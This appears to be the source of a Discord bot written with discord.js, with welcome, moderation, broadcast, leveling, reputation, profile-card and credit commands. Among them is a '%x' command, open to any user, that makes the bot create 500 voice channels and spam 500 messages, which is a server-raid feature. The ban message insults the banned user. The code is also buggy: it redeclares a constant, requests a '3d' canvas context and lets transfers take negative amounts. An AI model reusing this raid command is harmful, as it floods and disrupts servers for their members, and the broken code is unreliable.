const Discord = require('discord.js');
const client = new Discord.Client();
const Canvas = require("canvas");
const fs = require("fs");
const userData = JSON.parse(fs.readFileSync('./userData.json', 'utf8'));
var Canvas = require('canvas')
var jimp = require('jimp')
const moment = require('moment');
const pretty = require('pretty-ms');
const rn = require('random-number');
let done = {};
const prefix = '%'


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`ATLANTIC BOT | %help`,"http://twitch.tv/S-F")
  console.log('')
  console.log('') 
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});


client.on('guildMemberAdd', member => {
    let channel = member.guild.channels.find('name', 'welcome-my-dear');
    let memberavatar = member.user.avatarURL
      if (!channel) return;
    let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(memberavatar)
        .addField(':running_shirt_with_sash: | name :  ',`${member}`)
        .addField(':loudspeaker: | Norther server oh my heart' , `Welcome to the server, ${member}`)
        .addField(':id: | user :', "**[" + `${member.id}` + "]**" )
                .addField('| You are the member number',`${member.guild.memberCount}`)
               
                  .addField("Name:",`<@` + `${member.id}` + `>`, true)
                     
                                     .addField(' server', `${member.guild.name}`,true)
                                       
     .setFooter("**THE ATLANTIC**")
        .setTimestamp()
   
      channel.sendEmbed(embed);
    });

	





client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc1') {
    if (!args[1]) {
return;
}
        message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .addField(' » message : ', args)
            .setColor('#ff0000')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});


client.on('message', message => {
    if (message.author.bot) return;
    if(message.content == '%member') {
    const embed = new Discord.RichEmbed()
    .addField(` **ATLANTIC** Members`,'-',   true)
.addField(`  online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}`,'-',   true)
.addField(`  dnd:     ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}`,'-',   true)
.addField(`  idle:      ${message.guild.members.filter(m=>m.presence.status == 'idle').size}`,'-',   true)   
.addField(`  offline:   ${message.guild.members.filter(m=>m.presence.status == 'offline').size}`,'-',  true) 
.addField(`  all:  ${message.guild.memberCount}`,'-',   true)         
         message.channel.send({embed});

    }
  });


client.on('message', function(msg) {
         var prefix = "%"
    if(msg.content.startsWith (prefix  + 'server')) {
      let embed = new Discord.RichEmbed()
      .setColor('RANDOM') 
      .setThumbnail(msg.guild.iconURL)
      .setTitle(`Showing Details Of  **${msg.guild.name}*`)
      .addField(':globe_with_meridians:** Server region**',`[** __${msg.guild.region}__ **]`,true)
      .addField(':page_facing_up: ** __Roles__**',`[** __${msg.guild.roles.size}__ **]`,true)
      .addField(':red_circle: **__ Members__**',`[** __${msg.guild.memberCount}__ **]`,true)
      .addField(':large_blue_circle: **__ Online members__**',`[** __${msg.guild.members.filter(m=>m.presence.status == 'online').size}__ **]`,true)
      .addField(':pencil:**__ Text channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'text').size}__** ]`,true)
      .addField(':microphone2:**__ Voice channels__**',`[** __${msg.guild.channels.filter(m => m.type === 'voice').size}__ **]`,true)
      .addField(':crown:**__ Server owner__**',`**${msg.guild.owner}**`,true)
      msg.channel.send({embed:embed});
    }
  });

	  
	  
	const devs = ['348555232529219585'];
const adminprefix = "%";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!devs.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
  }
  });  
	  
	  

	  
client.on('message', message => {
    if (message.author.id === client.user.id) return;
            if (message.content.startsWith(prefix + "ping")) {
        message.channel.sendMessage(':ping_pong: Pong! In `' + `${client.ping}` + ' ms`');
    }
});	    

	  
	  
client.on('message',function(message) {
    let toKick = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + 'kick')) {
       if(!message.member.hasPermission("KICK_MEMBERS")) return message.reply('**# - You dont have enough permissions!**');
       if(toKick.bannable) return message.reply("**# - I cannot kick someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toKick.id === message.author.id) return message.reply("**# You cannot kick yourself!**")
       if(!message.guild.member(toKick).bannable) return message.reply("**# - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("You have been kicked from a server!")
       .setThumbnail(toKick.avatarURL)
       .addField("**# - Server:**",message.guild.name,true)
       .addField("**# - Reason:**",toReason,true)
       .addField("**# - Kicked By:**",message.author,true)
       if(message.member.hasPermission("KICK_MEMBERS")) return (
           toKick.sendMessage({embed: toEmbed}).then(() => message.guild.member(toKick).kick()).then(() => message.channel.send(`**Yes Ma Boy I Have Been _kicked_  ${toKick}**`))
       )
       }
});

	  
	 
	 
client.on("message", function(message) {
    let toBan = message.mentions.users.first();
    let toReason = message.content.split(" ").slice(2).join(" ");
    let toEmbed = new Discord.RichEmbed()
   if(message.content.startsWith(prefix + "ban")) {
       if(!message.member.hasPermission("BAN_MEMBERS")) return message.reply("**# - You dont have enough permissions!**");
       if(!toBan) return message.reply("**# - Mention a user!**");
       if(toBan.id === ("441924652437209090")) return message.reply("** You cannot ban me!**");
       if(toBan === message.member.guild.owner) return message.reply("** You cannot ban the owner of the server!**");
       if(toBan.bannable) return message.reply("**# - I cannot ban someone with a higher role than me!**");
       if(!toReason) return message.reply("**# - Supply a reason!**")
       if(toBan.id === message.author.id) return message.reply("** You cannot ban yourself!**")
       if(!message.guild.member(toBan).bannable) return message.reply("** - I cannot ban this person!**")
       let toEmbed;
       toEmbed = new Discord.RichEmbed()
       .setTitle("Hello MotherFucker :wave: You Have Been Banned From ``ATLANTIC`` Go Away And Die Alone !")
       .setThumbnail(toBan.avatarURL)
       .addField("** - Server:**",message.guild.name,true)
       .addField("** - Reason:**",toReason,true)
       .addField("** - Banned By:**",message.author,true)
       if(message.member.hasPermission("BAN_MEMBERS")) return (
           toBan.sendMessage({embed: toEmbed}).then(() => message.guild.member(toBan).ban({reason: toReason})).then(() => message.channel.send(`**Yes Ma Boy I Have Been banned  ${toBan}**`))
       );
       
   }
}); 
	  


client.on("message", message => {
  if (message.author.bot) return;
  
  let command = message.content.split(" ")[0];
  
  if (command === "%mute") {
        if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
  let user = message.mentions.users.first();
  let modlog = client.channels.find('name', 'mute-log','time');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply("** Does No Role 'Muted' **").catch(console.error);
  if (message.mentions.users.size < 1) return message.reply('** You Need To Mention Member First**').catch(console.error);
  
  const embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setTimestamp()
    .addField('Use:', 'Talk/Shut Up')
    .addField('Muted:', `${user.username}#${user.discriminator} (${user.id})`)
    .addField('By:', `${message.author.username}#${message.author.discriminator}`)
   
   if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply('** You Dont have  Permission Manage Roles **').catch(console.error);
 
  if (message.guild.member(user).roles.has(muteRole.id)) {
return message.reply("**:white_check_mark: .. Member Was Muted**").catch(console.error);
} else {
    message.guild.member(user).addRole(muteRole).then(() => {
return message.reply("**:white_check_mark: .. Member Was Muted**").catch(console.error);
});
  }

};

});
client.on("message", message => {
  if (message.author.bot) return;
  
  let command = message.content.split(" ")[0];
  
  if (command === "%unmute") {
        if (!message.member.hasPermission('MANAGE_ROLES')) return message.reply("** I Dont Have Permission 'Manage Roles' **").catch(console.error);
  let user = message.mentions.users.first();
  let modlog = client.channels.find('name', 'mute-log');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply("** Does No Role 'Muted' **").catch(console.error);
  if (message.mentions.users.size < 1) return message.reply('** You Need To Mention Member First**').catch(console.error);
  const embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .setTimestamp()
    .addField('Use:', 'Talk/Shut Up')
    .addField('UnMuted:', `${user.username}#${user.discriminator} (${user.id})`)
    .addField('By:', `${message.author.username}#${message.author.discriminator}`)

  if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply('** You Dont have  Permission Manage Roles **').catch(console.error);

  if (message.guild.member(user).removeRole(muteRole.id)) {
return message.reply("**:white_check_mark: .. Member Was UnMuted **").catch(console.error);
} else {
    message.guild.member(user).removeRole(muteRole).then(() => {
return message.reply(":white_check_mark:  has been unmuted!  **").catch(console.error);
});
  }

};

});
















client.on("message", message => {
  if (message.content === "%help") {
  message.channel.send('``Check Your DMs bud  ``')
   const embed = new Discord.RichEmbed()
       .setColor('Black')
       .setFooter('By [Eriep] And [Vervolek]')
       .setThumbnail(message.author.avatarURL)
       .setDescription(`
 +[ ---------------------------- ]+
   **Administrationr Commands**
 +[ ---------------------------- ]+
 %ban    <member> <reason>   | For Ban A Member
 %kick   <member> <reason>   | For Kick A Member
 %mute   <member> <reason>   | For Mute A Member
 %unmute <member>            | For Unmute A Member
 %warn   <member> <reason>   | Warn A Memebr
 %bc1                        | For Do BroadCast
 +[ ---------------------------- ]+
         **General  Commands**
 +[ ---------------------------- ]+
 %help                       | For Sent This Message
 %report <member> <reason>   | For Report A Member
 %server                     | For See Server Stats
 %members                    | For See Members Stats

 `)
 message.author.send(embed);
}  
});







client.on('message', message => {

  if (message.content.startsWith( prefix + "report")) {
  if (!message.channel.guild) return;
  let args = message.content.split(" ").slice(1).join(' ');
  client.channels.get("406189462419144745").send(
      "\n" + "**" + " Member : " + "**" +
      "\n" + "**" + ":arrow_right:  " + message.author.tag + "**" +
      "\n" + "**" + " Reported : " + "**" +
      "\n" + "**" + args + "**")

  }
  });



  
  
  

client.on('message', message => {

    if (message.content.startsWith("back")) {        
    const embed = new Discord.RichEmbed()
        .setColor("#081070")
        .setDescription(" Welcome Back :tada:")
      message.channel.sendEmbed(embed).then(message => {message.delete(60000)});
}
});




  

  
client.on('message', message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;
  if(!message.channel.guild) return;
  if(!message.member.hasPermission('BAN_MEMBERS')) return;
  if (message.mentions.users.size < 1) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);
if (command == "warn") {
    let say = new Discord.RichEmbed()
    .setDescription(args.join("  "))
    .setColor(0x831f18)
    message.channel.sendEmbed(say);
    client.channels.get("462865002819223552").send(`**=========================================**`)
    client.channels.get("462865002819223552").send(`**New Warn ! @Control Tower**`)
    client.channels.get("462865002819223552").send({embed : say})
    client.channels.get("462865002819223552").send(`**Admin : ${message.author.username}#${message.author.discriminator}**`)
    client.channels.get("462865002819223552").send(`**In Channel : ${message.channel}**`)
    client.channels.get("462865002819223552").send(`**==========================================**`	)
    message.delete();
  }


});





 
 

 client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'x')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('ATLANTIC GANG', 'voice')
        message.channel.send('lol');
}
}
}); 



client.on('message', message => {
    if (message.content.includes('https://discord.gg')){
    if(!message.channel.guild) return message.reply ('')
    if (!message.member.hasPermissions(['MANAGE_MESSAGES'])){
    message.channel.send('kick <@' + message.author.id + '>')
    message.delete() 
    }
    }
    if (message.content.startsWith("kick ")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply();
    var member= message.mentions.members.first();
    member.kick().then((member) => {
    message.channel.sendMessage("", {embed: {
    author: {
    },
    title: 'Reason Adversting ' + member.displayName + ' Kicked',
    color: 490101,
    }
    });
    }
    ) 
    }
    });




////////////RANK

client.on("message", function(message){
if (message.content.startsWith(prefix + "rank")) {
	if (!userData[message.author.id]) {
		userData[message.author.id] = {Money:0,Xp:0,Level:0}
	}
     var mentionned = message.mentions.users.first();

      var x5bzm;
      if(mentionned){
          var x5bzm = mentionned;
      } else {
          var x5bzm = message.author;
          
      }
	fs.writeFile("./userData.json",JSON.stringify(userData), function(err){
		if (err) console.log(err);
	})
	var CulLevel = Math.floor(0.25 * Math.sqrt(userData[message.author.id].Xp +1));
	if (CulLevel > userData[message.author.id].Level) {userData[message.author.id].Level +=CulLevel}
	let pEmbed = new Discord.RichEmbed()
	.setColor("Random")
	.addField("Name:", message.author.tag)
	.addField("Level:", userData[message.author.id].Level)
	.addField("Xp:",Math.floor(userData[message.author.id].Xp))
	.addField("Money:",Math.floor(userData[x5bzm.id].money))
	message.channel.send(pEmbed);
}
if (!userData[message.author.id]) {
	userData[message.author.id] = {Money:0,Xp:0,Level:0,Like:0}
	}

	fs.writeFile("./userData.json",JSON.stringify(userData), function(err){
		if (err) console.log(err);
	})
userData[message.author.id].Xp+= 0.25;
userData[message.author.id].Money+= 0.25;

});
//BY NorElden
////////////LEVEL
//BY NorElden
 let points = JSON.parse(fs.readFileSync("./level.json", "utf8"));
 client.on("message", message => {
   if (!message.content.startsWith(prefix)) return;
   if (message.author.bot) return;

   if (!points[message.author.id]) points[message.author.id] = {
     points: 0,
     level: 0
   };
   let userData = points[message.author.id];
   userData.points++;
 
   let curLevel = Math.floor(0.1 * Math.sqrt(userData.points));
   if (curLevel > userData.level) {
     // Level up message
     userData.level = curLevel;
     message.channel.send(`**:up: | ${message.author.username} You leveled up to ${curLevel}**`);
   }
   if (message.content.startsWith(prefix + "level")) {
     message.channel.send(`**${message.author.username} You are level is ${userData.level}**`);
   }
   fs.writeFile("./level.json", JSON.stringify(points), (err) => {
     if (err) console.error(err)
   });
 
 });
//BY NorElden
////////////REP
//BY NorElden
let rep = JSON.parse(fs.readFileSync("./rep.json", "utf8"));
client.on('message', message => { 
    if(!rep[message.author.id]) rep[message.author.id] = {
        reps: 'NOT YET',
        repo: 0,
    }
    if(message.content.startsWith(prefix + 'rep')) {
      if(!message.channel.guild) return;
                    moment.locale('ar');
        let ment = message.mentions.users.first();
       var getvalueof;
       if(ment) {
           getvalueof = ment;
    } else {
           getvalueof = message.author;
    }
    if(rep[message.author.id].reps != moment().format('L')) {
            rep[message.author.id].reps = moment().format('L');
            rep[getvalueof.id].repo += 1; // يضيف واحد كل مره يستخدم الامر
            message.channel.send(`** :white_check_mark: Successfly Added rep To ${getvalueof} **`)
        } else {
           message.channel.send(`** You Do it Befor \' Pls Try Agin After:`  + moment().endOf('day').fromNow().replace('in ', 'بعد ') + '**')
        }
       }
    fs.writeFile('./rep.json', JSON.stringify(rep), (err) => {
     if(err) throw err.message + ' '+err.file;
 })
});
//BY NorElden
////////////PROFILE
//BY NorElden
client.on("message",  message => {
     var mentionned = message.mentions.users.first();
      var z;
      if(mentionned){
          var z = mentionned;
      } else {
          var z = message.author;
          
      }
     let ment = message.mentions.users.first();
       var getvalueof;
       if(ment) {
           getvalueof = ment;
    } else {
           getvalueof = message.author;
    }
    if(message.author.bot) return;
    if(message.channel.type ==="dm") return;
    let messageArray = message.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
    let msg = message.content.toUpperCase();
    if(!command.startsWith(prefix)) return;
    
    var jimp = require('jimp')
    const w = ['./images_profile/1.png',];
    if(command === prefix + 'profile') {
    let Canvas = require('canvas')
    let canvas = new Canvas(500, 500)

    let ctxx = canvas.getContext('3d')
    let Images = Canvas.Image
    fs.readFile(__dirname + '/images_profile/1.png', function(err, picture) { 
      if (err) throw err
      var img = new Images
      img.onload = () => {
        ctx.drawImage(img, 5, 5, 500, 500) 
      }
      img.src = picture
    })
     
    let ctx = canvas.getContext('2d')
    let Image = Canvas.Image
    fs.readFile(__dirname + '/images_profile/background.png', function(err, picture) { 
    if (err) throw err
    var img = new Image
    img.onload = () => {
    ctx.drawImage(img, 0, 0, 500, 500) 
      }
      img.src = picture
    })
   
                      let url = getvalueof.displayAvatarURL.endsWith(".webp") ? getvalueof.displayAvatarURL.slice(5, -20) + ".png" : getvalueof.displayAvatarURL;
                      jimp.read(url, (err, ava) => {
                          if (err) return console.log(err);
                          ava.getBuffer(jimp.MIME_PNG, (err, buf) => {
                              if (err) return console.log(err);
      
	                //XP
			ctx.font = '22px Cairo';
			ctx.fillStyle = '#020202';
			ctx.fillText(`Total XP : ${Math.floor(userData[z.id].Xp)}`,  110,467);
	                //MONEY
			ctx.font = '24px Cairo';
			ctx.fillStyle = '#020202';
			ctx.fillText(`Credits : ${Math.floor(userData[z.id].money)}`,  220,360);
                        //USERNAME
                   	ctx.font = '25px Cairo';
			ctx.fillStyle = '#020202';
                        ctx.fillText(`${z.username}`, 215, 170)
                        //LEVEL
			ctx.font = '30px Cairo';
			ctx.textAlign = 'left';
			ctx.fillStyle = '#020202';
			ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
			ctx.fillText(`${userData[z.id].level}`, 90, 310);
		        //info Box :)
                        ctx.font = '25px Cairo';
                        ctx.textAlign = 'left';
			ctx.fillStyle = '#020202';
                        ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
                        ctx.fillText(`${userData[z.id].text}`,265 , 270)
                        //LIKE
                        ctx.font = '25px Cairo';
                        ctx.textAlign = 'Center';
                        ctx.fillStyle = '#020202';
                        ctx.shadowColor = 'rgba(0, 0, 0, 0.4)';
                        ctx.fillText(`❤${rep[message.author.id].repo}`, 80,395);
			//AVATAR
                        let Avatar = Canvas.Image;
                        let ava = new Avatar;
                        ava.src = buf;
                        ctx.beginPath();
                        ctx.arc(98, 144, 84, 0, Math.PI*2, true); 
                        ctx.closePath();
                        ctx.clip();
                        ctx.drawImage(ava, 13, 60, 175, 175);

    setTimeout(function() {
      fs.readFile(__dirname + '/images_profile/background.png', function(err, picture) {
        if (err) throw err
        var img = new Image
        img.onload = () => {
          ctx.drawImage(img, -1, -1, 0, 0)
        }
        img.src = picture
        let inventoryPicture = canvas.toDataURL()
        let data = inventoryPicture.replace(/^data:image\/\w+;base64,/, "")
        let buf = new Buffer(data, 'base64')
        fs.writeFile(`images.png`, buf)
        message.channel.send(`**:pencil: | Showing your Profile ${message.author.username}**`, {
          file: `images.png` // Or replace with FileOptions object
        })
      })
    }, 1000)

    function roundedImage(x, y, width, height, radius) {
      ctx.beginPath();
      ctx.moveTo(x + radius, y);
      ctx.lineTo(x + width - radius, y);
      ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
      ctx.lineTo(x + width, y + height - radius);
      ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
      ctx.lineTo(x + radius, y + height);
      ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
      ctx.lineTo(x, y + radius);
      ctx.quadraticCurveTo(x, y, x + radius, y);
      ctx.closePath();
    }

    function wrapText(context, text, x, y, maxWidth, lineHeight) {

      var words = text.split(' '),
        line = '',
        lineCount = 0,
        i,
        test,
        metrics;

      for (i = 0; i < words.length; i++) {
        test = words[i];
        metrics = context.measureText(test);
        while (metrics.width > maxWidth) {
          // Determine how much of the word will fit
          test = test.substring(0, test.length - 1);
          metrics = context.measureText(test);
        }
        if (words[i] != test) {
          words.splice(i + 1, 0, words[i].substr(test.length))
          words[i] = test;
        }

        test = line + words[i] + ' ';
        metrics = context.measureText(test);

        if (metrics.width > maxWidth && i > 0) {
          context.fillText(line, x, y);
          line = words[i] + ' ';
          y += lineHeight;
          lineCount++;
        } else {
          line = test;
        }
      }
      ctx.fillText(line, x, y);
    }
      })
      })
      }
      });

//BY NorElden//BY NorElden
//BY NorElden
//BY NorElden
client.on('message', message => {
if (message.author.bot) return null;
let sender = message.author;
let msg = message.content.toUpperCase();
if (!userData[sender.id]) userData[sender.id] = {}
if (!userData[sender.id].money) userData[sender.id].money = 200;
if (!userData[sender.id].lastDaily) userData[sender.id].lastDaily = 'Not Collected';
if (!userData[sender.id].messages) userData[sender.id].messages = 1;
if (!userData[sender.id].level) userData[sender.id].level = 1;
if (!userData[sender.id].like) userData[sender.id].like = 1;
if (!userData[sender.id].text) userData[sender.id].text = `${prefix}setinfo to set.`

if(message.content.startsWith(prefix + 'credit')) {
 var mentionned = message.mentions.users.first();
if (!userData[sender.id]) userData[sender.id] = {}
if (!userData[sender.id].money) userData[sender.id].money = 0;
fs.writeFile('./userData.json', JSON.stringify(userData), (err) => {
if (err) console.error(err);
})
        
    var x5bzm;
      if(mentionned){
          var x5bzm = mentionned;
      } else {
          var x5bzm = message.author;
          
      }

      var mando = message.mentions.users.id;
      if  (!userData[x5bzm.id]) userData[x5bzm.id] = {}
      if (!userData[x5bzm.id].money) userData[x5bzm.id].money = 0;
      message.channel.send("**:credit_card:  | **" + '`' + x5bzm.username + '`' + "** , your credit is :yen: **" + '`' + userData[x5bzm.id].money + '`' + "** credits!**")
}


let cont = message.content.slice(prefix.length).split(" ");
let args = cont.slice(1);
if(message.content.startsWith(prefix + 'transfer')) {
          if (!args[0]) {
            message.channel.send(`**قم بالتحويل عن طريق: ${prefix}credits <mention> <المبلغ>**`);
         return;
           }
        // We should also make sure that args[0] is a number
        if (isNaN(args[0])) {
            message.channel.send(`قم بالتحويل عن طريق: ${prefix}credits <mention> <المبلغ>**`);
            return; // Remember to return if you are sending an error message! So the rest of the code doesn't run.
             }
            let defineduser = '';
            let firstMentioned = message.mentions.users.first();
            defineduser = (firstMentioned)
            if (!defineduser) return message.channel.send(`قم بالتحويل عن طريق: ${prefix}credits <mention> <المبلغ>**`);
            var mentionned = message.mentions.users.first();
if (!userData[sender.id]) userData[sender.id] = {}
if (!userData[sender.id].money) userData[sender.id].money = 200;
fs.writeFile('./userData.json', JSON.stringify(userData), (err) => {
if (err) console.error(err);
})
      var mando = message.mentions.users.id;
      if  (!userData[defineduser.id]) userData[defineduser.id] = {}
      if (!userData[defineduser.id].money) userData[defineduser.id].money = 200;
      userData[defineduser.id].money += (+args[0]);
      userData[sender.id].money += (-args[0]);
      let mariam = message.author.username
message.channel.send('`' + mentionned.username + '`' + '** Ø§Ù„Ù‰  **'+ '`' + mariam + '`' + '**  ØªÙ… ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù…Ø¨Ù„Øº**'+ (args[0]) + '** :dollar: Ù…Ù† **')
}

if(message.content.startsWith(prefix + 'daily')) {
if (userData[sender.id].lastDaily != moment().format('6800000')) {
    userData[sender.id].lastDaily = moment().format('6800000')
    userData[sender.id].money += 200; 
    message.channel.send(`**${message.author.username} you collect your \`200\` :dollar: daily pounds**`)
} else {
    message.channel.send('**your next Daily :moneybag: : ' + moment().endOf('6800000').fromNow()  + '.**')
}
}
fs.writeFile('./userData.json', JSON.stringify(userData), (err) => {
if (err) console.error(err);
})

if(message.content.startsWith(prefix + 'setinfo')) {
if (!userData[message.author.id].text) userData[message.author.id].text = 'معلومات عني:';
var mard = userData[message.author.id].text
let args = message.content.split(' ').slice(1).join(' ');
if (!args) return message.channel.send('**عليك كتابه المعلومات بعد الامر التي تريد ان تغيره**')
userData[message.author.id].text = args ;
message.channel.send(':ballot_box_with_check:**تم تغير معلوماتك بنجاح**')
}
}
)
 
 
 












client.login(process.env.BOT_TOKEN);
